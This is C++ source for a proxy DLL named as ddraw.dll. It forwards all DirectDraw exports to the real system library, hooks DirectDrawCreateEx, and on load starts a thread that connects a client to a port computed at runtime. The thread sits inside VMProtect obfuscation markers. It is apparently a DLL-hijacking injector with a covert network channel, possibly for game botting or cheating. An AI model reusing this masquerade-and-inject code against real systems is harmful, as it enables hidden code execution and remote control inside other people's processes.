// ---------------------------------------------------------------------------

#include <windows.h>
#include "debugUtils.h"
#include "ddfunc.h"

#define DLL_EXPORT __declspec(dllexport)

extern "C" __stdcall __declspec(naked, dllexport) HRESULT WINAPI AcquireDDThreadLock() {
	// debugar("AcquireDDThreadLock %X", AcquireDDThreadLockVAR);
	__asm jmp AcquireDDThreadLockVAR
}

extern "C" __stdcall __declspec(naked, dllexport) HRESULT WINAPI CheckFullscreen() {
	// debugar("CheckFullscreen %X", CheckFullscreenVAR);
	__asm jmp CheckFullscreenVAR
}

extern "C" __stdcall __declspec(naked, dllexport) HRESULT WINAPI CompleteCreateSysmemSurface(DWORD param1) {
	// debugar("CompleteCreateSysmemSurface %X", CompleteCreateSysmemSurfaceVAR);
	__asm jmp CompleteCreateSysmemSurfaceVAR
}

extern "C" __stdcall __declspec(naked, dllexport) HRESULT WINAPI D3DParseUnknownCommand(DWORD param1, DWORD param2) {
	// debugar("D3DParseUnknownCommand %X", D3DParseUnknownCommand);
	__asm jmp D3DParseUnknownCommandVAR
}

extern "C" __stdcall __declspec(naked, dllexport) HRESULT WINAPI DDGetAttachedSurfaceLcl(DWORD param1, DWORD param2, DWORD param3) {
	// debugar("DDGetAttachedSurfaceLcl");
	__asm jmp DDGetAttachedSurfaceLclVAR
}

extern "C" __stdcall __declspec(naked, dllexport) HRESULT WINAPI DDInternalLock(DWORD param1, DWORD param2) {
	// debugar("DDInternalLock");
	__asm jmp DDInternalLockVAR
}

extern "C" __stdcall __declspec(naked, dllexport) HRESULT WINAPI DDInternalUnlock(DWORD param1) {
	// debugar("DDInternalUnlock");
	__asm jmp DDInternalUnlockVAR
}

extern "C" __stdcall __declspec(naked, dllexport) HRESULT WINAPI DirectDrawCreate(DWORD param1, DWORD *lplpDD, DWORD *pUnkOuter) {
	// debugar("DirectDrawCreate %X", DirectDrawCreate);
	__asm jmp DirectDrawCreateVAR
}

extern "C" __stdcall __declspec(naked, dllexport) HRESULT WINAPI DirectDrawCreateClipper(DWORD dwFlags, DWORD *lplpDDClipper, DWORD *pUnkOuter) {
	// debugar("DirectDrawCreateClipper");
	__asm jmp DirectDrawCreateClipperVAR
}

extern "C" __stdcall __declspec(naked, dllexport) HRESULT WINAPI DirectDrawCreateEx(DWORD *lpGuid, DWORD* lplpDD, DWORD* iid, DWORD *pUnkOuter) {
	__asm mov edi, edi
	__asm push ebp
	__asm mov ebp, esp
	__asm pushad

	HRESULT resultado = H_DirectDrawCreateEx(lpGuid, lplpDD, iid, pUnkOuter);
	//__asm call DirectDrawCreateExVAR

	__asm popad
	__asm mov eax, resultado
	__asm mov esp, ebp
	__asm pop ebp
	__asm ret 10h
}

extern "C" __stdcall __declspec(dllexport) HRESULT WINAPI DirectDrawEnumerateA(DWORD lpCallback, LPVOID lpContext) {
	// debugar("DirectDrawEnumerateA");
//	__asm mov edi, edi
//	__asm push ebp
//	__asm mov ebp, esp
//	__asm pushad
//
//	__asm push lpContext
//	__asm push lpCallback
//	__asm call DirectDrawEnumerateAVAR
//
//	__asm popad
//	__asm mov eax, resultado
//	__asm mov esp, ebp
//	__asm pop ebp
//	__asm ret 8h
      __asm jmp DirectDrawEnumerateAVAR
}

extern "C" __stdcall __declspec(naked, dllexport) HRESULT WINAPI DirectDrawEnumerateExA(DWORD lpCallback, LPVOID lpContext, DWORD dwFlags) {
	// debugar("DirectDrawEnumerateExA");
	__asm jmp DirectDrawEnumerateExAVAR
}

extern "C" __stdcall __declspec(naked, dllexport) HRESULT WINAPI DirectDrawEnumerateExW(DWORD lpCallback, LPVOID lpContext, DWORD dwFlags) {
	// debugar("DirectDrawEnumerateExW");
	__asm jmp DirectDrawEnumerateExWVAR
}

extern "C" __stdcall __declspec(naked, dllexport) HRESULT WINAPI DirectDrawEnumerateW(DWORD lpCallback, LPVOID lpContext) {
	// debugar("DirectDrawEnumerateW");
	__asm jmp DirectDrawEnumerateWVAR
}

extern "C" __stdcall __declspec(naked, dllexport) HRESULT WINAPI DllCanUnloadNow() {
	// debugar("DllCanUnloadNow");
	__asm jmp DllCanUnloadNowVAR
}

//#ifdef __BORLANDC__//__BORLANDC__
extern "C" __stdcall __declspec(naked, dllexport) HRESULT WINAPI DllGetClassObject(DWORD* rclsid, DWORD* riid, DWORD *ppv) {
	// debugar("DllGetClassObject");
	__asm jmp DllGetClassObjectVAR
}
//#endif

extern "C" __stdcall __declspec(naked, dllexport) HRESULT WINAPI DSoundHelp(HWND hWnd, int, int) {
	// debugar("DSoundHelp");
	__asm jmp DSoundHelpVAR
}

extern "C" __stdcall __declspec(naked, dllexport) HRESULT WINAPI GetDDSurfaceLocal(DWORD param1, DWORD param2, DWORD param3) {
	// debugar("GetDDSurfaceLocal");
	__asm jmp GetDDSurfaceLocalVAR
}

extern "C" __stdcall __declspec(naked, dllexport) HRESULT WINAPI GetOLEThunkData(DWORD param1) {
	// debugar("GetOLEThunkData");
	__asm jmp GetOLEThunkDataVAR
}

extern "C" __stdcall __declspec(naked, dllexport) HRESULT WINAPI GetSurfaceFromDC(DWORD param1, DWORD param2, DWORD param3) {
	// debugar("GetSurfaceFromDC");
	__asm jmp GetSurfaceFromDCVAR
}

extern "C" __stdcall __declspec(naked, dllexport) HRESULT WINAPI RegisterSpecialCase(DWORD param1, DWORD param2, DWORD param3, DWORD param4) {
	// debugar("RegisterSpecialCase");
	__asm jmp RegisterSpecialCaseVAR
}

extern "C" __stdcall __declspec(naked, dllexport) VOID WINAPI ReleaseDDThreadLock(DWORD param1) {
	// debugar("ReleaseDDThreadLock");
	__asm jmp ReleaseDDThreadLockVAR
}

//DWORD WINAPI ThreadAliveDD(LPVOID lpParam) {
//	int total = 0;
//	while (true) {
//		Sleep(5);
//		total++;
//		if (total > 200) {
//			total = 0;
//			debugar("DD rodando...");
//		}
//	}
//}

DWORD WINAPI ThreadConectarWrap(LPVOID lpParam) {
	VMProtectBegin("conectar");
//	debugar("Iniciou...");
	while (WaitForSingleObject(cliente->closeFlag, 800) != WAIT_OBJECT_0) {
			__try {
				if (!cliente->conectado) {
					int portaServidor = 0;
					int porta = getPorta();

					portaServidor = (int)(porta/1354);
//					debugar("Porta: %d", portaServidor);

					if (portaServidor >= 3131 && portaServidor <= 33999) {
						__try{
							cliente->conectar(portaServidor);
						}__except(1){
						}
						if (cliente->conectado) {
							debugar("wmx conectado!!");
//							__try {
//									char dirPlug[5] = "CM";
//									cliente->enviar(TP_MENSAGEM, (char*)&dirPlug[0], strlen(&dirPlug[0]));
//								Sleep(1500);
//							} __except (1) {
//								debugar("Erro 9142");
//							}
						}
					}
					else {
						Sleep(2000);
					}
				}
			}
			__except (1) {
				debugar("Erro 6777");
			}
	}
	VMProtectEnd();
}

HANDLE *threads;

void inicializarDD(){
	VMProtectBegin("indd01");
 	char systemDir[270];
	memset(&systemDir[0], 0, 258);
	GetSystemDirectoryA(&systemDir[0], 258);
	strcat(&systemDir[0], "\\ddraw.dll");
	HMODULE ddrawMod = LoadLibraryA(systemDir);

	// HMODULE msv = LoadLibraryA("msvcrt36.dll");
	// debugar("msv: %X", msv);

	// debugar("modulo: %s", systemDir);
	// debugar("modulo: %X", ddrawMod);

	AcquireDDThreadLockVAR = (PROC)GetProcAddress(ddrawMod, "AcquireDDThreadLock");
	// debugar("var 1: %X", AcquireDDThreadLockVAR);
	CheckFullscreenVAR = (PROC)GetProcAddress(ddrawMod, "CheckFullscreen");
	// debugar("var 2: %X", CheckFullscreenVAR);
	CompleteCreateSysmemSurfaceVAR = (PROC)GetProcAddress(ddrawMod, "CompleteCreateSysmemSurface");
	// debugar("var 3: %X", CompleteCreateSysmemSurfaceVAR);
	D3DParseUnknownCommandVAR = (PROC)GetProcAddress(ddrawMod, "D3DParseUnknownCommand");
	// debugar("var 4: %X", D3DParseUnknownCommandVAR);
	DDGetAttachedSurfaceLclVAR = (PROC)GetProcAddress(ddrawMod, "DDGetAttachedSurfaceLcl");
	// debugar("var 5: %X", DDGetAttachedSurfaceLclVAR);
	DDInternalLockVAR = (PROC)GetProcAddress(ddrawMod, "DDInternalLock");
	// debugar("var 6: %X", DDInternalLockVAR);
	DDInternalUnlockVAR = (PROC)GetProcAddress(ddrawMod, "DDInternalUnlock");
	// debugar("var 7: %X", DDInternalUnlockVAR);
	DirectDrawCreateVAR = (PROC)GetProcAddress(ddrawMod, "DirectDrawCreate");
	// debugar("var 8: %X", DirectDrawCreateVAR);
	DirectDrawCreateClipperVAR = (PROC)GetProcAddress(ddrawMod, "DirectDrawCreateClipper");
	// debugar("var 9: %X", DirectDrawCreateClipperVAR);
	DirectDrawCreateExVAR = (MyDirectDrawCreateEx_Type)GetProcAddress(ddrawMod, "DirectDrawCreateEx");
	// debugar("var 10: %X", DirectDrawCreateExVAR);
	DirectDrawEnumerateAVAR = (PROC)GetProcAddress(ddrawMod, "DirectDrawEnumerateA");
	// debugar("var 11: %X", DirectDrawEnumerateAVAR);
	DirectDrawEnumerateExAVAR = (PROC)GetProcAddress(ddrawMod, "DirectDrawEnumerateExA");
	// debugar("var 12: %X", DirectDrawEnumerateExAVAR);
	DirectDrawEnumerateExWVAR = (PROC)GetProcAddress(ddrawMod, "DirectDrawEnumerateExW");
	// debugar("var 13: %X", DirectDrawEnumerateExWVAR);
	DirectDrawEnumerateWVAR = (PROC)GetProcAddress(ddrawMod, "DirectDrawEnumerateW");
	// debugar("var 14: %X", DirectDrawEnumerateWVAR);
	DllCanUnloadNowVAR = (PROC)GetProcAddress(ddrawMod, "DllCanUnloadNow");
	// debugar("var 15: %X", DllCanUnloadNowVAR);
	DllGetClassObjectVAR = (PROC)GetProcAddress(ddrawMod, "DllGetClassObject");
	// debugar("var 16: %X", DllGetClassObjectVAR);
	DSoundHelpVAR = (PROC)GetProcAddress(ddrawMod, "DSoundHelp");
	// debugar("var 17: %X", DSoundHelpVAR);
	GetDDSurfaceLocalVAR = (PROC)GetProcAddress(ddrawMod, "GetDDSurfaceLocal");
	// debugar("var 18: %X", GetDDSurfaceLocalVAR);
	GetOLEThunkDataVAR = (PROC)GetProcAddress(ddrawMod, "GetOLEThunkData");
	// debugar("var 19: %X", GetOLEThunkDataVAR);
	GetSurfaceFromDCVAR = (PROC)GetProcAddress(ddrawMod, "GetSurfaceFromDC");
	// debugar("var 20: %X", GetSurfaceFromDCVAR);
	RegisterSpecialCaseVAR = (PROC)GetProcAddress(ddrawMod, "RegisterSpecialCase");
	// debugar("var 21: %X", RegisterSpecialCaseVAR);
	ReleaseDDThreadLockVAR = (PROC)GetProcAddress(ddrawMod, "ReleaseDDThreadLock");
	// debugar("var 22: %X", ReleaseDDThreadLockVAR);

	cliente = new Cliente((PROC)processar);
	cliente->inicializar();

	threads = new HANDLE[3];
	threads[0] = CreateThread(NULL, 0, ThreadConectarWrap, NULL, 0, NULL);
	SetThreadContext(threads[0], (CONTEXT*)THREAD_PRIORITY_BELOW_NORMAL);
	VMProtectEnd();
}

// ===============================================================================================//
WSADATA dataWSA;
extern "C" __declspec(dllexport) BOOL WINAPI DllEntryPoint(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
	BOOL bReturnValue = TRUE;
	switch (dwReason) {
	case DLL_PROCESS_ATTACH: {

			// HANDLE *threads = new HANDLE[3];
			// threads[0] = CreateThread(NULL, 0, ThreadAliveDD, NULL, 0, NULL);
			// SetThreadContext(threads[0], (CONTEXT*)THREAD_PRIORITY_BELOW_NORMAL);

			DisableThreadLibraryCalls(hinstDLL);
			__try{
				WSAStartup(0x101,&dataWSA);
			}__except(1){
			}

			inicializarDD();
		} break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}
// ===============================================================================================//
